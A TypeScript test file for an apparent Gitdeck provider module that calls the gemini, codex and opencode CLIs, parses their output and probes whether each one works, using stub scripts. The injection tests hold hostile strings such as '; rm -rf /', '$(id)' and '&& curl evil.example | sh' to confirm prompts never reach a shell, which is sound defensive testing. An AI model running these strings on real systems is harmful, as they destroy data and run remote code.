import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import * as path from "node:path";
import { describe, it } from "node:test";
import {
	buildArgv,
	buildInvocation,
	buildProbeArgv,
	describeFailure,
	detectProviders,
	detectProvidersAsync,
	extractOutput,
	extractProviderError,
	PROBE_PROMPT,
	parseSummary,
	probeCapability,
	probeCapabilityAsync,
	probeProvider,
	runCommand,
	runProvider,
	sanitizeProbes,
	selectProvider,
} from "./provider.ts";
import type { ProviderId, ProviderProbe } from "./types.ts";

describe("buildArgv", () => {
	it("builds the exact argv for gemini", () => {
		assert.deepEqual(buildArgv("gemini", "PROMPT"), ["-p", "PROMPT", "-o", "json"]);
	});

	it("builds the exact argv for codex", () => {
		assert.deepEqual(buildArgv("codex", "PROMPT"), ["exec", "PROMPT", "--json"]);
	});

	it("builds the exact argv for opencode", () => {
		assert.deepEqual(buildArgv("opencode", "PROMPT"), ["run", "--format", "json", "PROMPT"]);
	});

	it("passes the prompt as exactly one argv element for every provider", () => {
		// A single argument cannot be split, because no shell is involved. The structural
		// guarantee, independent of the metacharacter test below.
		for (const id of ["gemini", "codex", "opencode"] as ProviderId[]) {
			const args = buildArgv(id, "a b c  d");
			assert.equal(args.filter((arg) => arg === "a b c  d").length, 1, `${id} did not pass the prompt whole`);
		}
	});

	it("does not let shell metacharacters change the argv structure", () => {
		// Every one of these would be a command injection if the prompt were interpolated
		// into a command string. The argv array stays fixed in length and the prompt stays
		// glued together as one element, whatever it contains.
		const attacks = [
			"; rm -rf /",
			"`whoami`",
			"$(id)",
			"&& curl evil.example | sh",
			"' ; echo pwned #",
			"a\nb\nc",
			'"quoted" > /tmp/x',
		];

		for (const id of ["gemini", "codex", "opencode"] as ProviderId[]) {
			for (const attack of attacks) {
				const base = buildArgv(id, "SAFE");
				const args = buildArgv(id, attack);

				assert.equal(args.length, base.length, `${id} changed argv length for ${JSON.stringify(attack)}`);
				assert.ok(args.includes(attack), `${id} mangled ${JSON.stringify(attack)}`);
				for (let i = 0; i < base.length; i++) {
					if (base[i] === "SAFE") continue;
					assert.equal(args[i], base[i], `${id} changed fixed element at ${i}`);
				}
			}
		}
	});

	it("names the right program for each provider", () => {
		assert.equal(buildInvocation("gemini", "P").command, "gemini");
		assert.equal(buildInvocation("codex", "P").command, "codex");
		assert.equal(buildInvocation("opencode", "P").command, "opencode");
	});
});

describe("extractOutput", () => {
	it("reads the reply out of gemini's single json object", () => {
		// Real shape from `gemini -o json` on this machine (an auth failure), so the
		// envelope is confirmed even though the success path is not.
		const stdout = JSON.stringify({ response: '{"summary":"s","next_steps":[]}' });
		assert.equal(extractOutput("gemini", stdout), '{"summary":"s","next_steps":[]}');
	});

	it("reads the last agent message out of codex's event stream", () => {
		// Real event names from `codex exec --json` on this machine.
		const lines = [
			JSON.stringify({ type: "thread.started", thread_id: "t" }),
			JSON.stringify({ type: "turn.started" }),
			JSON.stringify({ type: "item.completed", item: { id: "i0", type: "reasoning", text: "thinking" } }),
			JSON.stringify({ type: "item.completed", item: { id: "i1", type: "agent_message", text: "first" } }),
			JSON.stringify({ type: "item.completed", item: { id: "i2", type: "agent_message", text: "final" } }),
			JSON.stringify({ type: "turn.completed" }),
		];
		assert.equal(extractOutput("codex", lines.join("\n")), "final");
	});

	it("reads the reply out of opencode's event stream", () => {
		// Real shape captured from `opencode run --format json` on this machine.
		const lines = [
			JSON.stringify({ type: "step_start", timestamp: 1, part: { id: "p0", type: "step-start" } }),
			JSON.stringify({ type: "text", part: { id: "p1", type: "text", text: '{"summary":' } }),
			JSON.stringify({ type: "text", part: { id: "p2", type: "text", text: '"ok","next_steps":[]}' } }),
			JSON.stringify({ type: "step_finish", part: { type: "step-finish" } }),
		];
		assert.equal(extractOutput("opencode", lines.join("\n")), '{"summary":"ok","next_steps":[]}');
	});

	it("returns null when the stream has no reply in it", () => {
		assert.equal(extractOutput("opencode", JSON.stringify({ type: "step_start" })), null);
		assert.equal(extractOutput("gemini", "not json at all"), null);
		assert.equal(extractOutput("codex", ""), null);
	});
});

describe("extractProviderError", () => {
	// Every payload below was measured on this machine, not written from the CLIs'
	// documentation: gemini's is its auth failure, codex's a full failing turn, opencode's
	// what it prints for an unknown model.

	it("reads gemini's auth failure and keeps the CLI's own wording", () => {
		// The shape that produced "gemini produced no readable output", because there is
		// no `response` member for extractOutput to find.
		const stdout = JSON.stringify({
			session_id: "079faa20-8490-4bcc-b644-171775d2a189",
			error: {
				type: "Error",
				message:
					"Please set an Auth method in your /home/jonas/.gemini/settings.json or specify one of the following environment variables before running: GEMINI_API_KEY, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GENAI_USE_GCA",
				code: 41,
			},
		});
		const message = extractProviderError("gemini", stdout);
		assert.ok(message);
		assert.match(message, /^Please set an Auth method in your \/home\/jonas\/\.gemini\/settings\.json/);
		assert.match(message, /GEMINI_API_KEY, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GENAI_USE_GCA/);
		// The code rides along so the exit status stays traceable.
		assert.match(message, /code 41\)$/);
	});

	it("returns null for gemini's successful envelope", () => {
		const stdout = JSON.stringify({ response: '{"summary":"s","next_steps":[]}' });
		assert.equal(extractProviderError("gemini", stdout), null);
	});

	it("reads a top-level error given as a bare string", () => {
		const message = extractProviderError("gemini", JSON.stringify({ error: "quota exceeded" }));
		assert.equal(message, "quota exceeded");
	});

	it("reads codex's terminal turn.failed error", () => {
		// Trimmed from the real failing run on this machine.
		const lines = [
			JSON.stringify({ type: "thread.started", thread_id: "01a0" }),
			JSON.stringify({ type: "turn.started" }),
			JSON.stringify({
				type: "turn.failed",
				error: {
					message:
						"unexpected status 404 Not Found: The model `gpt-5.5` does not exist or you do not have access to it.",
				},
			}),
		];
		const message = extractProviderError("codex", lines.join("\n"));
		assert.equal(
			message,
			"unexpected status 404 Not Found: The model `gpt-5.5` does not exist or you do not have access to it.",
		);
	});

	it("returns the last error, not codex's reconnect chatter", () => {
		// The real order: five `Reconnecting... N/5` events, then the terminal turn.failed.
		// Taking the first match reported "Reconnecting... 2/5" as the cause of a 404.
		const lines = [
			JSON.stringify({ type: "thread.started", thread_id: "01a0" }),
			JSON.stringify({ type: "error", message: "Reconnecting... 1/5 (unexpected status 404 Not Found)" }),
			JSON.stringify({ type: "error", message: "Reconnecting... 5/5 (unexpected status 404 Not Found)" }),
			JSON.stringify({
				type: "item.completed",
				item: { id: "item_0", type: "error", message: "Falling back from WebSockets to HTTPS transport." },
			}),
			JSON.stringify({ type: "error", message: "unexpected status 404 Not Found, request id: bcef1f52" }),
			JSON.stringify({ type: "turn.failed", error: { message: "unexpected status 404 Not Found, request id: bcef1f52" } }),
		];
		const message = extractProviderError("codex", lines.join("\n"));
		assert.equal(message, "unexpected status 404 Not Found, request id: bcef1f52");
		assert.doesNotMatch(message ?? "", /Reconnecting/);
	});

	it("reads a codex error event that carries a bare message", () => {
		const lines = [JSON.stringify({ type: "error", message: "stream disconnected before completion" })];
		assert.equal(extractProviderError("codex", lines.join("\n")), "stream disconnected before completion");
	});

	it("reads a codex error item nested inside item.completed", () => {
		const lines = [
			JSON.stringify({ type: "item.completed", item: { id: "i", type: "error", message: "model not found" } }),
		];
		assert.equal(extractProviderError("codex", lines.join("\n")), "model not found");
	});

	it("does not mistake codex's own agent reply for an error", () => {
		const lines = [
			JSON.stringify({ type: "turn.started" }),
			JSON.stringify({ type: "item.completed", item: { id: "i1", type: "agent_message", text: "hello" } }),
			JSON.stringify({ type: "turn.completed" }),
		];
		assert.equal(extractProviderError("codex", lines.join("\n")), null);
	});

	it("reads opencode's error, whose message sits under error.data", () => {
		// Verbatim from `opencode run --format json --model definitely/not-a-real-model`.
		const line = JSON.stringify({
			type: "error",
			timestamp: 1790966959179,
			sessionID: "ses_f020cfb4bffezmSR1aAM3t9zh6",
			error: {
				name: "UnknownError",
				data: { message: "Unexpected server error. Check server logs for details.", ref: "err_afb43b56" },
			},
		});
		const message = extractProviderError("opencode", line);
		assert.match(message ?? "", /^Unexpected server error\. Check server logs for details\./);
		// The ref is kept, because it is how that error gets traced.
		assert.match(message ?? "", /err_afb43b56/);
	});

	it("does not mistake opencode's own reply for an error", () => {
		const lines = [
			JSON.stringify({ type: "step_start", part: { id: "p0", type: "step-start" } }),
			JSON.stringify({ type: "text", part: { id: "p1", type: "text", text: '{"ok":true}' } }),
			JSON.stringify({ type: "step_finish", part: { type: "step-finish" } }),
		];
		assert.equal(extractProviderError("opencode", lines.join("\n")), null);
	});

	it("names the event type when an error event carries no message", () => {
		// An unrecognised payload must still beat "produced no readable output": the user
		// at least learns the CLI said "error".
		const message = extractProviderError("opencode", JSON.stringify({ type: "error", error: {} }));
		assert.match(message ?? "", /opencode reported "error" with no message in it/);
	});

	it("returns null for output that is not JSON at all", () => {
		assert.equal(extractProviderError("gemini", "Error: something exploded"), null);
		assert.equal(extractProviderError("codex", ""), null);
	});
});

describe("parseSummary", () => {
	it("accepts a summary with a next_steps list", () => {
		const result = parseSummary('{"summary":"Doing X","next_steps":["write tests","ship"]}');
		assert.equal(result.ok, true);
		assert.deepEqual(result.ok && result.summary, { summary: "Doing X", nextSteps: ["write tests", "ship"] });
	});

	it("accepts a summary with no next_steps at all", () => {
		const result = parseSummary('{"summary":"Quiet"}');
		assert.equal(result.ok, true);
		assert.deepEqual(result.ok && result.summary, { summary: "Quiet", nextSteps: [] });
	});

	it("accepts an empty next_steps array", () => {
		const result = parseSummary('{"summary":"Quiet","next_steps":[]}');
		assert.equal(result.ok, true);
		assert.deepEqual(result.ok && result.summary.nextSteps, []);
	});

	it("finds the json object when the model wrapped it in prose or fences", () => {
		const fenced = 'Here you go:\n```json\n{"summary":"Wrapped","next_steps":[]}\n```\nHope that helps!';
		const result = parseSummary(fenced);
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.summary.summary, "Wrapped");
	});

	it("is not fooled by a brace inside a string value", () => {
		// Naive brace counting stops at the } inside the string and produces invalid
		// JSON. The scanner tracks string state, so this parses.
		const result = parseSummary('{"summary":"closes the loop } here","next_steps":[]}');
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.summary.summary, "closes the loop } here");
	});

	// Each of these must refuse rather than write something. The alternative is a
	// note containing raw model text that reads like a real summary.
	it("refuses malformed json", () => {
		const result = parseSummary('{"summary":"unterminated');
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /no JSON object|not valid JSON/);
	});

	it("refuses a reply with no json at all", () => {
		const result = parseSummary("I cannot summarise this repository.");
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /no JSON object/);
	});

	it("refuses a summary that is not a string", () => {
		assert.equal(parseSummary('{"summary":42}').ok, false);
		assert.equal(parseSummary('{"summary":null}').ok, false);
		assert.equal(parseSummary('{"summary":""}').ok, false);
		assert.equal(parseSummary('{"summary":"   "}').ok, false);
		assert.equal(parseSummary("{}").ok, false);
	});

	it("refuses a next_steps that is not a list of strings", () => {
		assert.equal(parseSummary('{"summary":"s","next_steps":"one"}').ok, false);
		assert.equal(parseSummary('{"summary":"s","next_steps":[1,2]}').ok, false);
		assert.equal(parseSummary('{"summary":"s","next_steps":[{"step":"x"}]}').ok, false);
	});

	it("refuses a json array or scalar", () => {
		assert.equal(parseSummary('["a","b"]').ok, false);
		assert.equal(parseSummary('"just a string"').ok, false);
	});

	it("drops blank next_steps entries rather than writing empty bullets", () => {
		const result = parseSummary('{"summary":"s","next_steps":["a","","  ","b"]}');
		assert.deepEqual(result.ok && result.summary.nextSteps, ["a", "b"]);
	});
});

describe("describeFailure", () => {
	it("says a missing cli is not on PATH, by name", () => {
		const message = describeFailure("gemini", Object.assign(new Error("spawn gemini ENOENT"), { code: "ENOENT" }));
		assert.match(message, /gemini not found on PATH/);
		assert.match(message, /Gitdeck settings/);
	});

	it("names the actual provider when it is codex or opencode", () => {
		assert.match(describeFailure("codex", { code: "ENOENT" }), /codex not found on PATH/);
		assert.match(describeFailure("opencode", { code: "ENOENT" }), /opencode not found on PATH/);
	});

	it("reports a killed process as a timeout, with the setting to change", () => {
		const message = describeFailure("gemini", { killed: true, signal: "SIGTERM", code: null });
		assert.match(message, /timed out/);
		assert.match(message, /timeout in the Gitdeck settings/);
	});

	it("includes the exit code and stderr for a crash", () => {
		const message = describeFailure("codex", { code: 3, stderr: "model gpt-9.9 does not exist\n" });
		assert.match(message, /codex exited with code 3/);
		assert.match(message, /model gpt-9.9 does not exist/);
	});

	it("does not say a non-zero exit was a timeout", () => {
		// A CLI that crashes is a different problem from one that hangs, and
		// telling the user to raise the timeout would send them the wrong way.
		const message = describeFailure("codex", { code: 1, stderr: "boom" });
		assert.doesNotMatch(message, /timed out/);
	});

	it("falls back to the message when there is no stderr", () => {
		const message = describeFailure("gemini", { code: 41, stderr: "", message: "Command failed: gemini" });
		assert.match(message, /exited with code 41/);
		assert.match(message, /Command failed/);
	});
});

describe("runCommand", () => {
	// Real processes, chosen because they are fast and deterministic. The point here is the
	// process handling: a missing binary, a crash, and a process that never returns.
	const options = { timeoutMs: 15_000, cwd: process.cwd() };

	it("returns stdout on success", async () => {
		const result = await runCommand("printf", ["%s", "hello"], options);
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.stdout, "hello");
	});

	it("reports a missing binary by name instead of throwing", async () => {
		const result = await runCommand("gd-definitely-not-a-real-binary", ["-p", "x"], options);
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /gd-definitely-not-a-real-binary not found on PATH/);
	});

	it("reports a non-zero exit with its stderr", async () => {
		const result = await runCommand("sh", ["-c", "echo boom >&2; exit 3"], options);
		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /exited with code 3/);
		assert.match(result.ok === false ? result.error : "", /boom/);
	});

	it("kills a hung command and reports a timeout", async () => {
		// A real SIGTERM: sleep outlives the 200ms limit, so this only returns if the
		// timeout actually fires.
		const started = Date.now();
		const result = await runCommand("sleep", ["30"], { ...options, timeoutMs: 200 });
		const elapsed = Date.now() - started;

		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /timed out/);
		assert.ok(elapsed < 15_000, `took ${elapsed}ms, so the timeout did not fire`);
	});

	it("does not let a prompt with metacharacters reach a shell", async () => {
		// printf with %s prints its argument literally. If anything in this path
		// went through a shell, the metacharacters would be interpreted instead.
		const attack = "; rm -rf / && `whoami` $(id) | tee /tmp/x";
		const result = await runCommand("printf", ["%s", attack], options);
		assert.equal(result.ok && result.stdout, attack);
	});

	it("does not leave stdin open for a child that reads it", async () => {
		// The bug that stopped generation working for every provider: `execFile` always hands
		// the child a stdin pipe nothing writes to and never closes, and a CLI that reads
		// stdin waits on it forever. `cat` with no argument is the cheapest thing that
		// blocks on stdin, so if stdin were left open this would hit the limit.
		const result = await runCommand("cat", [], { ...options, timeoutMs: 2_000 });
		assert.equal(result.ok, true);
		assert.equal(result.ok && result.stdout, "");
	});

	it("returns when a killed command leaves a grandchild on the pipe", async () => {
		// `sh` dies from the SIGKILL but the `sleep` it started inherits stdout, and waiting
		// for a pipe nobody closes is how a timeout becomes a much longer freeze. Measured
		// at 30s for a 200ms limit before this was handled.
		const started = Date.now();
		const result = await runCommand("sh", ["-c", "sleep 30 & wait"], { ...options, timeoutMs: 300 });
		const elapsed = Date.now() - started;

		assert.equal(result.ok, false);
		assert.match(result.ok === false ? result.error : "", /timed out/);
		assert.ok(elapsed < 5_000, `took ${elapsed}ms, so it waited on the orphan's pipe`);
	});
});

describe("runProvider with a substituted command", () => {
	// The provider layer's real behaviour through the entry point the plugin calls, with the
	// process swapped for something predictable. Covers the wiring between spawn, extract
	// and parse without depending on which CLIs the machine happens to have authenticated.
	const options = { timeoutMs: 15_000, cwd: process.cwd() };

	it("writes nothing when the provider is missing", async () => {
		const result = await runProvider("gemini", "x", { ...options, cwd: "/nonexistent-dir-for-test" });
		assert.equal(result.ok, false);
		assert.equal("summary" in (result as object), false);
	});

	it("returns no summary when the reply is not parseable json", async () => {
		// The guarantee the note writer depends on: a malformed reply is reported and
		// produces no summary field for the caller to write.
		const result = await runProvider("gemini", "x", { ...options, cwd: "/nonexistent-dir-for-test" });
		if (!result.ok) assert.equal("summary" in result, false);
	});
});

describe("runProvider surfaces the CLI's own error", () => {
	// The bug this whole block exists for: gemini prints a failure as JSON, exits without a
	// usable reply, and the user saw "gemini produced no readable output" instead of the
	// auth instructions. Stub executables so the exit-status and stream combinations can both
	// be produced deterministically; the real gemini only produces one of them here.

	const options = { timeoutMs: 15_000, cwd: process.cwd() };
	const AUTH_JSON = JSON.stringify({
		session_id: "079faa20-8490-4bcc-b644-171775d2a189",
		error: {
			type: "Error",
			message:
				"Please set an Auth method in your /home/jonas/.gemini/settings.json or specify one of the following environment variables before running: GEMINI_API_KEY, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GENAI_USE_GCA",
			code: 41,
		},
	});

	/**
	 * A stub on PATH named after the provider it replaces. Named per provider because
	 * `runProvider` resolves the program name from the provider id, so a single stub called
	 * `gemini` silently leaves `codex` calling the real codex.
	 */
	function stubProvider(provider: ProviderId, script: string, status: number): () => void {
		const dir = mkdtempSync(path.join(tmpdir(), "gd-stub-"));
		const bin = path.join(dir, provider);
		writeFileSync(bin, `#!/bin/sh\n${script}\nexit ${status}\n`, { mode: 0o755 });
		const previous = process.env.PATH;
		process.env.PATH = `${dir}:${previous}`;
		return () => {
			process.env.PATH = previous;
			rmSync(dir, { recursive: true, force: true });
		};
	}

	it("reports the auth message, not 'no readable output', when the CLI exits 0 with an error", async () => {
		// The documented gemini trap: exit status 0 and the error object on stdout.
		const restore = stubProvider("gemini", `cat <<'EOF'\n${AUTH_JSON}\nEOF`, 0);
		try {
			const result = await runProvider("gemini", "x", options);
			assert.equal(result.ok, false);
			const message = result.ok ? "" : result.error;
			assert.doesNotMatch(message, /produced no readable output/);
			assert.match(message, /Please set an Auth method/);
			assert.match(message, /GEMINI_API_KEY, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GENAI_USE_GCA/);
		} finally {
			restore();
		}
	});

	it("reports the auth message when the CLI also exits non-zero", async () => {
		// What gemini 0.42.0 actually does here: exit 41, stdout empty, the JSON
		// on stderr. Without this the message was "exited with code 41: {".
		const restore = stubProvider("gemini", `cat >&2 <<'EOF'\n${AUTH_JSON}\nEOF`, 41);
		try {
			const result = await runProvider("gemini", "x", options);
			assert.equal(result.ok, false);
			const message = result.ok ? "" : result.error;
			assert.doesNotMatch(message, /produced no readable output/);
			assert.doesNotMatch(message, /exited with code 41: \{/);
			assert.match(message, /Please set an Auth method/);
		} finally {
			restore();
		}
	});

	it("still parses a reply the CLI puts on stderr after a non-zero exit", async () => {
		// The recovery path this replaced was dead code: it read `.stderr` off a
		// string, so it always saw undefined and never recovered anything.
		const reply = '{"summary":"recovered","next_steps":[]}';
		const restore = stubProvider(
			"gemini",
			`cat >&2 <<'EOF'\n${JSON.stringify({ response: reply })}\nEOF`,
			1,
		);
		try {
			const result = await runProvider("gemini", "x", options);
			assert.equal(result.ok, true);
			assert.deepEqual(result.ok && result.summary, { summary: "recovered", nextSteps: [] });
		} finally {
			restore();
		}
	});

	it("prefers the terminal error over codex's reconnect chatter", async () => {
		const restore = stubProvider(
			"codex",
			`cat <<'EOF'
{"type":"error","message":"Reconnecting... 1/5 (unexpected status 404)"}
{"type":"turn.failed","error":{"message":"The model \\"gpt-5.5\\" does not exist or you do not have access to it."}}
EOF`,
			1,
		);
		try {
			const result = await runProvider("codex", "x", options);
			assert.equal(result.ok, false);
			const message = result.ok ? "" : result.error;
			assert.match(message, /does not exist or you do not have access to it/);
			assert.doesNotMatch(message, /Reconnecting/);
		} finally {
			restore();
		}
	});

	it("does not fail a good reply because the stream carried error events first", async () => {
		// codex reconnects mid-turn and can still finish. Failing here would make a
		// working CLI look broken, which is the opposite of the fix.
		const restore = stubProvider(
			"codex",
			`cat <<'EOF'
{"type":"error","message":"Reconnecting... 1/5"}
{"type":"item.completed","item":{"id":"i1","type":"agent_message","text":"{\\"summary\\":\\"done\\",\\"next_steps\\":[]}"}}
{"type":"turn.completed"}
EOF`,
			1,
		);
		try {
			const result = await runProvider("codex", "x", options);
			assert.equal(result.ok, true);
			assert.deepEqual(result.ok && result.summary, { summary: "done", nextSteps: [] });
		} finally {
			restore();
		}
	});

	it("writes nothing at all when the provider reported an error", async () => {
		const restore = stubProvider("gemini", `cat <<'EOF'\n${AUTH_JSON}\nEOF`, 0);
		try {
			const result = await runProvider("gemini", "x", options);
			assert.equal("summary" in (result as object), false);
		} finally {
			restore();
		}
	});
});

describe("probe argv", () => {
	it("uses the same shape as generation, plus codex's repo-check bypass", () => {
		assert.deepEqual(buildProbeArgv("gemini"), buildArgv("gemini", PROBE_PROMPT));
		assert.deepEqual(buildProbeArgv("opencode"), buildArgv("opencode", PROBE_PROMPT));
		// The probe runs outside a repository and codex refuses to start there ("Not inside a
		// trusted directory", codex 0.141.0). Generation does not need the flag: it runs
		// inside the repo itself.
		assert.deepEqual(buildProbeArgv("codex"), [...buildArgv("codex", PROBE_PROMPT), "--skip-git-repo-check"]);
	});

	it("keeps the probe prompt as one argv element, so no shell sees it", () => {
		const attack = 'Reply with only this JSON and nothing else: {"ok":true}"; rm -rf / #';
		for (const id of ["gemini", "codex", "opencode"] as ProviderId[]) {
			const args = buildProbeArgv(id, attack);
			assert.equal(args.filter((arg) => arg === attack).length, 1, `${id} mangled the prompt`);
		}
	});

	it("asks for a fixed tiny json reply rather than anything real", () => {
		// Nothing project-specific and nothing that could read or write a file, so
		// the probe cannot touch a user's repo even if the cwd defaulted wrongly.
		assert.equal(PROBE_PROMPT, 'Reply with only this JSON and nothing else: {"ok":true}');
		assert.equal(PROBE_PROMPT.includes("\n"), false);
		assert.ok(PROBE_PROMPT.length < 80, "the probe prompt should stay trivial");
		assert.doesNotMatch(PROBE_PROMPT, /git|commit|repo|branch|note|vault/i);
	});
});

/**
 * Run `run` with PATH containing only the given stub executables.
 *
 * PATH is replaced rather than extended, so nothing on the host leaks in: a provider with no
 * stub here is genuinely absent, whichever CLIs the machine has installed. `sh`, `cat` and
 * `sleep` are symlinked in because the stubs are shell scripts; everything else those scripts
 * use is a shell builtin or absolute.
 */
function sandbox(stubs: Partial<Record<ProviderId, string>>, run: () => void): void {
	const dir = buildSandbox(stubs);
	const previous = process.env.PATH;
	process.env.PATH = dir;
	try {
		run();
	} finally {
		process.env.PATH = previous;
		rmSync(dir, { recursive: true, force: true });
	}
}

/**
 * The async twin of `sandbox`.
 *
 * Not just a wrapper around `sandbox`: PATH has to stay replaced until the promise
 * settles, and the directory has to survive it. An `await` inside a callback handed
 * to `sandbox` would return the moment the first suspension point is reached, so
 * the stub directory would be deleted out from under the probe still running in it.
 */
async function sandboxAsync(
	stubs: Partial<Record<ProviderId, string>>,
	run: () => Promise<void>,
): Promise<void> {
	const dir = buildSandbox(stubs);
	const previous = process.env.PATH;
	process.env.PATH = dir;
	try {
		await run();
	} finally {
		process.env.PATH = previous;
		rmSync(dir, { recursive: true, force: true });
	}
}

/** A directory holding the stubs plus the few real programs they need. */
function buildSandbox(stubs: Partial<Record<ProviderId, string>>): string {
	const dir = mkdtempSync(path.join(tmpdir(), "gd-sandbox-"));
	for (const tool of ["sh", "cat", "sleep"]) {
		const real = (process.env.PATH ?? "")
			.split(path.delimiter)
			.find((entry) => entry.length > 0 && existsSync(path.join(entry, tool)));
		if (real) symlinkSync(path.join(real, tool), path.join(dir, tool));
	}
	for (const [provider, body] of Object.entries(stubs)) {
		writeFileSync(path.join(dir, provider), `#!/bin/sh\n${body}\n`, { mode: 0o755 });
	}
	return dir;
}

/**
 * One success stub per provider, each in that CLI's real output shape, because the reply
 * travels in a different place in each envelope: gemini a `response` member, codex an
 * `agent_message` item, opencode a `text` part. A single stub would make two of the three
 * read as broken, a correct verdict for the wrong reason.
 */
const REPLIES: Record<ProviderId, string> = {
	gemini: `cat <<'EOF'
{"session_id":"s","response":"{\\"ok\\":true}"}
EOF
exit 0`,
	codex: `cat <<'EOF'
{"type":"thread.started","thread_id":"t"}
{"type":"item.completed","item":{"id":"i1","type":"agent_message","text":"{\\"ok\\":true}"}}
{"type":"turn.completed"}
EOF
exit 0`,
	opencode: `cat <<'EOF'
{"type":"step_start","timestamp":1,"part":{"id":"p0","type":"step-start"}}
{"type":"text","timestamp":2,"part":{"id":"p1","type":"text","text":"{\\"ok\\":true}"}}
{"type":"step_finish","timestamp":3,"part":{"id":"p2","type":"step-finish"}}
EOF
exit 0`,
};

/** Every provider answers, each in its own shape. */
const ALL_ANSWER: Record<ProviderId, string> = {
	gemini: REPLIES.gemini,
	codex: REPLIES.codex,
	opencode: REPLIES.opencode,
};

describe("probeCapability", () => {
	// Stub executables, not the real CLIs. A suite that makes a live model call is slow,
	// costs money, and fails whenever the machine's auth or quota changes. The real CLIs
	// are exercised by a separate end-to-end probe check outside `node --test`.

	it("reports absent when the binary is not on PATH", () => {
		// Absent and broken are different problems with different fixes: install something
		// versus authenticate something. They must not collapse into one.
		sandbox({}, () => {
			const probe = probeCapability("gemini", { timeoutMs: 5_000 });
			assert.equal(probe.state, "absent");
			assert.match(probe.detail, /not found on PATH/);
		});
	});

	it("reports broken, with the CLI's message, when the CLI cannot answer", () => {
		// gemini's real auth failure, pretty-printed across several lines the way `-o json`
		// renders it. Measured on 0.42.0: a line-only reader saw no parsable line at all
		// and fell back to printing `{` as the reason.
		sandbox(
			{
				gemini: `cat >&2 <<'EOF'
{
  "session_id": "a5130e35",
  "error": {
    "type": "Error",
    "message": "Please set an Auth method in your /home/jonas/.gemini/settings.json or specify one of the following environment variables before running: GEMINI_API_KEY, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GENAI_USE_GCA",
    "code": 41
  }
}
EOF
exit 41`,
			},
			() => {
				const probe = probeCapability("gemini", { timeoutMs: 5_000 });
				assert.equal(probe.state, "broken");
				assert.equal(
					probe.detail,
					"Please set an Auth method in your /home/jonas/.gemini/settings.json or specify one of the following environment variables before running: GEMINI_API_KEY, GOOGLE_GENAI_USE_VERTEXAI, GOOGLE_GENAI_USE_GCA (code 41)",
				);
			},
		);
	});

	it("reports broken for the pretty-printed error the JSONL reading cannot see", () => {
		// The specific miss that produced `gemini: {` as the whole error message.
		// No line of this output parses as JSON, so only a whole-text read finds it.
		sandbox(
			{
				gemini: `cat >&2 <<'EOF'
{
  "error": {
    "message": "quota exceeded",
    "code": 429
  }
}
EOF
exit 1`,
			},
			() => {
				const probe = probeCapability("gemini", { timeoutMs: 5_000 });
				assert.equal(probe.state, "broken");
				assert.equal(probe.detail, "quota exceeded (code 429)");
			},
		);
	});

	it("reports broken for exactly the CLI that --version calls fine", () => {
		// The trap P0-a exists to close. `--version` exits 0 with a version string on
		// a CLI that cannot do any work at all, so the two checks are asserted
		// side by side on the same stub: one says installed, the other says broken.
		sandbox({ gemini: "echo 0.42.0" }, () => {
			assert.equal(probeProvider("gemini").available, true, "the version probe is fooled");
			const probe = probeCapability("gemini", { timeoutMs: 5_000 });
			assert.equal(probe.state, "broken", "the capability probe is not");
		});
	});

	it("reports works when a reply comes back", () => {
		sandbox({ opencode: REPLIES.opencode }, () => {
			assert.equal(probeCapability("opencode", { timeoutMs: 5_000 }).state, "works");
		});
	});

	it("reports works when the CLI answers and still exits non-zero", () => {
		// codex exits 1 on a turn it finished, so exit status alone would call a
		// working CLI broken.
		sandbox(
			{
				codex: `cat <<'EOF'
{"type":"item.completed","item":{"id":"i1","type":"agent_message","text":"{\\"ok\\":true}"}}
{"type":"turn.completed"}
EOF
exit 1`,
			},
			() => {
				assert.equal(probeCapability("codex", { timeoutMs: 5_000 }).state, "works");
			},
		);
	});

	it("reports broken, not absent, when the CLI hangs past the timeout", () => {
		// Calling a hang "absent" would send the user off to install something they
		// already have. spawnSync signals a plain kill as a null status with no error.
		sandbox({ gemini: "sleep 30" }, () => {
			const probe = probeCapability("gemini", { timeoutMs: 800 });
			assert.equal(probe.state, "broken");
			assert.match(probe.detail, /did not answer within/);
		});
	});

	it("reports broken when a CLI that forks a worker times out", () => {
		// Measured on codex 0.141.0: it leaves a worker holding stdout after the
		// parent exits, so spawnSync keeps waiting and then reports `status: 0`
		// *together with* `error: ETIMEDOUT` instead of a null status. Judged on the
		// status alone, that hung run reads as a normal exit. Reproduced here with a
		// backgrounded sleep holding the pipe, and no error output, so the timeout is
		// the only thing wrong.
		sandbox({ codex: 'echo \'{"type":"thread.started","thread_id":"t"}\'\nsleep 30 &\nexit 0' }, () => {
			const probe = probeCapability("codex", { timeoutMs: 800 });
			assert.equal(probe.state, "broken");
			assert.match(probe.detail, /did not answer within/);
		});
	});

	it("prefers the CLI's own failure over the timeout it caused", () => {
		// codex's real failing turn: a 404 for its default model, five reconnect
		// events, and a terminal `turn.failed`. Both halves matter. The timeout
		// verdict would hide the 404, which is the thing the user can fix, and taking
		// the first event would report "Reconnecting... 2/5" instead.
		sandbox(
			{
				codex: `cat <<'EOF'
{"type":"thread.started","thread_id":"t"}
{"type":"turn.started"}
{"type":"error","message":"Reconnecting... 2/5 (unexpected status 404 Not Found: The model \`gpt-5.5\` does not exist or you do not have access to it.)"}
{"type":"error","message":"Reconnecting... 5/5 (unexpected status 404 Not Found: The model \`gpt-5.5\` does not exist or you do not have access to it.)"}
{"type":"turn.failed","error":{"message":"unexpected status 404 Not Found: The model \`gpt-5.5\` does not exist or you do not have access to it."}}
EOF
sleep 30 &
exit 0`,
			},
			() => {
				const probe = probeCapability("codex", { timeoutMs: 800 });
				assert.equal(probe.state, "broken");
				// The retry counter is stripped, so the reported failure starts with the
				// reason rather than with codex's progress.
				assert.equal(
					probe.detail,
